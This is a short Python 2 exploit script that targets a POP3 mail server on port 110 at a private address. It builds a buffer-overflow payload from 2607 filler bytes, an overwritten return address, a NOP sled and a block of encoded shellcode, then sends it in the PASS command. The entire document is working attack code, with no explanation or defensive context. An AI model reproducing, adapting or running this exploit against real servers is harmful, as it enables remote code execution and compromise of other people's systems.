#! /usr/bin/python
import socket
shellcode=(
"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0f\xde\x98"+
"\xbf\x83\xeb\xfc\xe2\xf4\xf3\xb4\x73\xf2\xe7\x27\x67\x40\xf0\xbe"+
"\x13\xd3\x2b\xfa\x13\xfa\x33\x55\xe4\xba\x77\xdf\x77\x34\x40\xc6"+
"\x13\xe0\x2f\xdf\x73\xf6\x84\xea\x13\xbe\xe1\xef\x58\x26\xa3\x5a"+
"\x58\xcb\x08\x1f\x52\xb2\x0e\x1c\x73\x4b\x34\x8a\xbc\x97\x7a\x3b"+
"\x13\xe0\x2b\xdf\x73\xd9\x84\xd2\xd3\x34\x50\xc2\x99\x54\x0c\xf2"+
"\x13\x36\x63\xfa\x84\xde\xcc\xef\x43\xdb\x84\x9d\xa8\x34\x4f\xd2"+
"\x13\xcf\x13\x73\x13\xff\x07\x80\xf0\x31\x41\xd0\x74\xef\xf0\x08"+
"\xfe\xec\x69\xb6\xab\x8d\x67\xa9\xeb\x8d\x50\x8a\x67\x6f\x67\x15"+
"\x75\x43\x34\x8e\x67\x69\x50\x57\x7d\xd9\x8e\x33\x90\xbd\x5a\xb4"+
"\x9a\x40\xdf\xb6\x41\xb6\xfa\x73\xcf\x40\xd9\x8d\xcb\xec\x5c\x9d"+
"\xcb\xfc\x5c\x21\x48\xd7\x05\xdf\x99\xaa\x69\xb6\x9f\x28\x69\x8d"+
"\x11\x5e\x9a\xb6\x74\x46\xa5\xbe\xcf\x40\xd9\xb4\x88\xee\x5a\x21"+
"\x48\xd9\x65\xba\xfe\xd7\x6c\xb3\xf2\xef\x56\xf7\x54\x36\xe8\xb4"+
"\xdc\x36\xed\xef\x58\x4c\xa5\x4b\x11\x42\xf1\x9c\xb5\x41\x4d\xf2"+
"\x15\xc5\x37\x75\x33\x14\x67\xac\x66\x0c\x19\x21\xed\x97\xf0\x08"+
"\xc3\xe8\x5d\x8f\xc9\xee\x65\xdf\xc9\xee\x5a\x8f\x67\x6f\x67\x73"+
"\x41\xba\xc1\x8d\x67\x69\x65\x21\x67\x88\xf0\x0e\xf0\x58\x76\x18"+
"\xe1\x40\x7a\xda\x67\x69\xf0\xa9\x64\x40\xdf\xb6\x68\x35\x0b\x81"+
"\xcb\x40\xd9\x21\x48\xbf")
buffer="A"*2607+"\xe3\x41\x4b\x5f"+"\x90"*8+shellcode
try:	
	print "send ..." 
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.1.1.24",110))
	s.recv(1024)
	s.send("USER text\r\n")
	s.recv(1024)
	s.send("PASS"+buffer+"\r\n")
	s.send("QUIT\r\n")
	s.close()
	print "Done"
except:
	print "unknow wrong"
